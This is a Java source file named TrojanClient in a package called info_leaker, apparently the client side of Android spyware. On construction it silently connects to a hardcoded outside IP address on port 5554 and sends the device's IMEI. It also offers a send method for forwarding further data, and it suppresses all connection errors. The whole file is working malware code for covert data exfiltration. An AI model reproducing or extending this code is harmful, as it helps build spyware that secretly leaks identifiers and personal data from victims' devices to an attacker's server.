package com.info_leaker;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;


public class TrojanClient {
	public static final int PORT = 5554;
	// change to your own ip
	public static final String IP = "59.78.12.107";
	
	boolean isConnect = false;
	PrintWriter os = null;		// output stream
	Socket m_socket;
	GetInfo m_getinfo;

	public TrojanClient(GetInfo gi){
		
		try {
			m_getinfo = gi;
			m_socket = new Socket(IP, PORT);
			m_socket.setSoTimeout(1000);
			isConnect = true;
			os = new PrintWriter(m_socket.getOutputStream());
			// send IMEI to server
			os.println(m_getinfo.getIMEI());
		} catch (IOException e) {
			// keep silent
			e.printStackTrace();
		}
	}
	
	public void send(String msg){
		if(isConnect)
			os.println(msg);
	}
	/**
	 * send close message to server and close connect
	 * call this if you want to disconnect
	 */
	public void close(){
		try {
			if(isConnect)
				os.println(Common.END);
			if (m_socket != null)
				m_socket.close();
			if (os != null)
				os.close();
		} catch (IOException e) {
			// keep silent
		}
		
	}
}
